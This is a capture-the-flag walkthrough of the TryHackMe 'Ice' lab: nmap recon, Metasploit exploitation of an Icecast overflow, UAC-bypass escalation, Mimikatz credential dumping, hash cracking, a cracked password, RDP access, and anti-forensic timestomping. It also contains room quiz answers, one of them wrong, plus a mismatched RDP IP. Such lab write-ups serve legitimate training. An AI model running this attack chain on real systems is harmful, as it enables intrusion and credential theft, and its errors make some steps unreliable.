# - ICE -



<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2Fa6ub68ZPiYEI6KCVDWqz%2F829892f5e7936a448f465b64d64f9c62%20(1).png?alt=media&#x26;token=c6bc860f-d914-4268-997c-3d1af2ebca9f" alt="" width="130"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure></div>

🔗 [Ice](https://tryhackme.com/room/ice)

#### Task 1 - Deploy the machine

🎯 Target IP: `10.10.139.241`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

#### Task 2 - Recon

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.139.241 ice.thm" >> /etc/hosts

mkdir thm/ice.thm
cd thm/ice.thm
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 ice.thm
PING ice.thm (10.10.139.241) 56(84) bytes of data.
64 bytes from ice.thm (10.10.139.241): icmp_seq=1 ttl=127 time=63.7 ms
64 bytes from ice.thm (10.10.139.241): icmp_seq=2 ttl=127 time=64.0 ms
64 bytes from ice.thm (10.10.139.241): icmp_seq=3 ttl=127 time=63.8 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~128 secs. this indicates that the target is a Windows system, while \*nix systems usually have a TTL of 64 secs.

#### 2.1 - Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine.

```bash
nmap --open -p0- -sS -n -Pn -vvv --min-rate 5000 ice.thm -oG nmap/port_scan
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-30 10:28 EDT
Initiating SYN Stealth Scan at 10:28
Scanning ice.thm (10.10.139.241) [65536 ports]
Discovered open port 445/tcp on 10.10.139.241
Discovered open port 135/tcp on 10.10.139.241
Discovered open port 139/tcp on 10.10.139.241
Discovered open port 3389/tcp on 10.10.139.241
Discovered open port 49154/tcp on 10.10.139.241
Discovered open port 49158/tcp on 10.10.139.241
Discovered open port 49152/tcp on 10.10.139.241
Discovered open port 49153/tcp on 10.10.139.241
Discovered open port 49159/tcp on 10.10.139.241
Discovered open port 8000/tcp on 10.10.139.241
Discovered open port 49160/tcp on 10.10.139.241
Discovered open port 5357/tcp on 10.10.139.241
Completed SYN Stealth Scan at 10:28, 15.41s elapsed (65536 total ports)
Nmap scan report for ice.thm (10.10.139.241)
Host is up, received user-set (0.066s latency).
Scanned at 2023-07-30 10:28:00 EDT for 15s
Not shown: 62056 closed tcp ports (reset), 3468 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5357/tcp  open  wsdapi        syn-ack ttl 127
8000/tcp  open  http-alt      syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49158/tcp open  unknown       syn-ack ttl 127
49159/tcp open  unknown       syn-ack ttl 127
49160/tcp open  unknown       syn-ack ttl 127
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

Now, we need to search which services are running on open ports:

```bash
nmap -p135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 -n -Pn -vvv -sCV --min-rate 5000 ice.thm -oN nmap/open_port
```

```bash
PORT      STATE SERVICE     REASON          VERSION
135/tcp   open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  Eicrosof�   syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped  syn-ack ttl 127
| rdp-ntlm-info: 
|   Target_Name: DARK-PC
|   NetBIOS_Domain_Name: DARK-PC
|   NetBIOS_Computer_Name: DARK-PC
|   DNS_Domain_Name: Dark-PC
|   DNS_Computer_Name: Dark-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2023-07-30T14:34:07+00:00
| ssl-cert: Subject: commonName=Dark-PC
| Issuer: commonName=Dark-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-07-29T13:59:58
| Not valid after:  2024-01-28T13:59:58
| MD5:   9fbe:1d20:5575:8e3d:82c8:2174:cfc5:691f
| SHA-1: 0d47:c268:ab69:de9b:55d7:ae6b:8446:9dd2:1aa3:a243
| -----BEGIN CERTIFICATE-----
| MIIC0jCCAbqgAwIBAgIQP+JwSZ4ShbhNZaZg/fD2kTANBgkqhkiG9w0BAQUFADAS
| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIzMDcyOTEzNTk1OFoXDTI0MDEyODEzNTk1
| OFowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBAN9U/vuy6wyZ/pJKOut4KqAdo3j3DIKorY2AAnMewCvUJufZmM6cBuRd
| 4HD8TRmAsN9tIgft6C3L8rCiMUuIMxVGqf562DSYnx7eFidoiCw+XshrjzKDUjTW
| JO431V58yn/6rXOrrCayJKHKKqzlG3BjOYLc+2MV0JwG8lmUAaHmHTVOVxo/8JhQ
| KyknchVese9a4czr9BL4PI3frBtKTuoSD335k+aElMxgJz49trOsgFTRf6kRqA2p
| cK6YH6E8ty5WxpIojrUaZ6MyePYBl5lN+i7RMx4O5iWcbs0F/nbt/I+EbqnVoz6h
| Lsa2cjkIYPpo8XPVdqGGeVLY6e+e4XsCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB
| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQB+EakCXBt4Ru7J
| 1mNrr1aRVYBoBTN/J0RONVOVkhiAcMSm8vgO/I+hlnjbJaJA6QyiQTWr33F9+1tS
| gCkpJWNncQdfosEWvIreF75U5+rND7rp/CnGBqboF0GW82r8b05l2hWBTGHxl0uc
| THF2W++5WGsFEOjziHMkilHiR/MEnWdiPzfXEQtu66s829WmcU/HcK1hIF4g/1Bx
| k8D3FRv55vJtaqXAilNcLNP63FzT45DC8K/hp+8VaUPvN4zz474sEb/rvGqwZSZS
| YFabVfHtoIUxkzjsxrXlONyJWhQgIMQCREOmI6Oe3MDtRk5Wv+i9UknIqxQjw4NK
| py8rnRih
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-30T14:34:22+00:00; 0s from scanner time.
5357/tcp  open  http        syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http        syn-ack ttl 127 Icecast streaming media server
| http-methods: 
|_  Supported Methods: GET
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  tcpwrapped  syn-ack ttl 127
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h14m09s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-30T09:34:07-05:00
| smb2-time: 
|   date: 2023-07-30T14:34:08
|_  start_date: 2023-07-30T13:59:57
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:94:10:4a:84:79 (unknown)
| Names:
|   DARK-PC<00>          Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   DARK-PC<20>          Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02:94:10:4a:84:79:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26968/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64093/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26942/udp): CLEAN (Timeout)
|   Check 4 (port 58078/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

#### 2.2 - Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2Fp1SvGPaqYm4eoFSFEr61%2FSchermata%20del%202023-07-30%2016-47-13.png?alt=media&#x26;token=dcd90f1e-cc18-4a47-b106-edb12091d627" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
3389
{% endhint %}

#### 2.3 - What service did nmap identify as running on port 8000? (First word of this service)

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FfcJrDb1PaiZ5PtuqVN15%2FSchermata%20del%202023-07-30%2016-49-25.png?alt=media&#x26;token=54ecca0a-57e6-4304-a351-6d83b600df73" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Icecast
{% endhint %}

#### 2.4 - What does Nmap identify as the hostname of the machine? (All caps for the answer)

```
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

{% hint style="info" %}
DARK-PC
{% endhint %}

### Task 3 - Gain Access

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2Fmc9jAqhqFtPendmCAvoJ%2Fimage.png?alt=media&#x26;token=8d245314-cf89-4fcd-9c83-27890157232a" alt="" width="106"><figcaption></figcaption></figure></div>

#### 3.1 - Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use [https://www.cvedetails.com](https://www.cvedetails.com) for this question and the next.

[https://www.cvedetails.com/cve/CVE-2004-1561/](https://www.cvedetails.com/cve/CVE-2004-1561/)

{% hint style="info" %}
execute code overflow
{% endhint %}

#### 3.2 - What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

[https://www.cvedetails.com/cve/CVE-2004-1561/](https://www.cvedetails.com/cve/CVE-2004-1561/)

{% hint style="info" %}
CVE-2004-1561
{% endhint %}

#### 3.3 - After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in '[RP: Metasploit](https://tryhackme.com/room/rpmetasploit)' which is recommended to be completed prior to this room, although not entirely necessary.

We run msfconsole and search icecast exploit:

```bash
search icecast
```

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FK5tCLLJmdEjvhxS2lSbq%2FSchermata%20del%202023-07-30%2019-21-05.png?alt=media&#x26;token=442ebdc4-fa64-4848-b104-36acd5f67341" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
exploit/windows/http/icecast\_header
{% endhint %}

#### 3.4 - Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FaxOF26O4Zp4P0PAPkEgW%2FSchermata%20del%202023-07-30%2019-23-42.png?alt=media&#x26;token=5f31df22-c825-45b9-bf50-3c7d1fbd45ae" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
RHOSTS
{% endhint %}

First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`

### Task 4 - Escalate

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FCkhmIzZrjzkGsJ29KR0N%2Fimage.png?alt=media&#x26;token=523d0743-3eaf-4c0d-92b8-eb5c55f828bf" alt="" width="188"><figcaption></figcaption></figure></div>

#### 4.1 - Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FuyXe03ZmptO7FqwRiPBT%2FSchermata%20del%202023-07-30%2019-26-16.png?alt=media&#x26;token=01946139-ba6d-4a98-a094-3c09bc4636dc" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
meterpreter
{% endhint %}

#### 4.2 - What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room.

```
getuid
```

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FfHfE0JWpNRhXjg8MCmsx%2FSchermata%20del%202023-07-30%2019-30-37.png?alt=media&#x26;token=3c1b6470-8ac5-467d-853d-46de1dac022f" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
Dark
{% endhint %}

#### 4.3 - What build of Windows is the system?

We can use sysinfo command:

```bash
sysinfo
```

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FefBwRGp6Uzw1ZvOrf4uO%2FSchermata%20del%202023-07-30%2019-32-27.png?alt=media&#x26;token=09ef97cd-2515-4cc7-92b5-d9fd06faa682" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
7601
{% endhint %}

#### 4.4 - Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?

We can see last result:

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FOhm1X184C3J0a9qER8kU%2FSchermata%20del%202023-07-30%2019-33-42.png?alt=media&#x26;token=0d9d49bc-0db5-4f04-b4f7-3b8b18018841" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
x64
{% endhint %}

Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. _This can appear to hang as it tests exploits and might take several minutes to complete_

#### _4.5 -_ Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FpMLVjDVAMM8n63cAjaDF%2FSchermata%20del%202023-07-30%2019-41-55.png?alt=media&#x26;token=a2f7454a-8018-4c9d-9238-090cf47ab22d" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
exploit/windows/local/bypassuac\_eventvwr
{% endhint %}

Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FSR6SnX9DLiA4eF5ACzWW%2FSchermata%20del%202023-07-30%2019-44-20.png?alt=media&#x26;token=ae400db2-8ef7-49ca-8181-8ba21352a9e9" alt=""><figcaption></figcaption></figure>

Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FM9t7K07nqNnWlSvElLSC%2FSchermata%20del%202023-07-30%2019-47-59.png?alt=media&#x26;token=4d3ebb4e-fc9f-48bf-8b27-809e55540ac5" alt=""><figcaption></figcaption></figure>

Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`

#### 4.6. - Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?

Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`

{% hint style="info" %}
LHOST
{% endhint %}

After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails.

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2Ft5D5B3JR74KGmrIHZiQL%2FSchermata%20del%202023-07-30%2019-52-01.png?alt=media&#x26;token=0d012230-08bf-4bb4-a06f-cb2edf6923c6" alt=""><figcaption></figcaption></figure>

Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

```
getprivs
```

We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2F363XBRhiq0ee3CmDlTAw%2FSchermata%20del%202023-07-30%2019-55-28.png?alt=media&#x26;token=39b124a0-ec1f-4cd4-bf2d-1831e10f07a2" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
SeSystemtimePrivilege
{% endhint %}

### Task 5 - Looting

Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FmB4pkbHlEX8zItEl8dnQ%2FSchermata%20del%202023-07-30%2020-22-59.png?alt=media&#x26;token=1a92a137-112e-42a7-b014-12ce1e5fb416" alt=""><figcaption></figcaption></figure>

In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

#### 5.1 - Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2F02Q3FKz5I6amSHD6IdCs%2FSchermata%20del%202023-07-30%2020-26-37.png?alt=media&#x26;token=1e526c3f-8bf1-4d29-bf82-e68b32fdb27c" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
spoolsv.exe
{% endhint %}

Migrate to this process now with the command `migrate -N PROCESS_NAME`

```
migrate 1372 spoolsv.exe
```

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FSOL3HliqIUHThsIQD5zQ%2FSchermata%20del%202023-07-30%2020-33-38.png?alt=media&#x26;token=40cad027-7811-47ec-b421-80498cd4d80e" alt=""><figcaption></figcaption></figure></div>

#### 5.2 - Let's check what user we are now with the command \`getuid\`. What user is listed?

```
getuid
```

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FDv1xHPrvPgDMOIIQuGEw%2FSchermata%20del%202023-07-30%2020-33-10.png?alt=media&#x26;token=16c10554-d086-4a61-bc90-264c5683632a" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
NT AUTHORITY\SYSTEM
{% endhint %}

Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)

```
load kiwi
```

Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`.

#### 5.3 - Which command allows up to retrieve all credentials?

{% hint style="info" %}
```
creds_all
```
{% endhint %}

#### 5.4 - Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)

```
hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

We save them in a txt files: hashes.txt, then we use John the Ripper to crack them:

```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

<details>

<summary>🚩 Dark's password</summary>

Password01!

</details>

### Task 6 - Post-Exploitation

Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.

#### 6.1 - What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)

{% hint style="info" %}
hashdump
{% endhint %}

#### 6.2 - While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?

{% hint style="info" %}
screenshare
{% endhint %}

#### 6.3 - How about if we wanted to record from a microphone attached to the system?

{% hint style="info" %}
record\_mic
{% endhint %}

#### 6.4 - To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.

{% hint style="info" %}
timestomp
{% endhint %}

Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

#### 6.5 - Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.

{% hint style="info" %}
golden\_ticket\_create
{% endhint %}

One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: \`run post/windows/manage/enable\_rdp\`

```bash
run post/windows/manage/enable_rdp
xfreerdp /u:Dark /p:Password01! /v:10.9.80.228
```

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FFyBQaNq5Ubm8q6QfXRke%2FSchermata%20del%202023-07-30%2021-03-24.png?alt=media&#x26;token=7e24d033-8ec8-4770-ae1c-00e343fafff8" alt=""><figcaption></figcaption></figure></div>
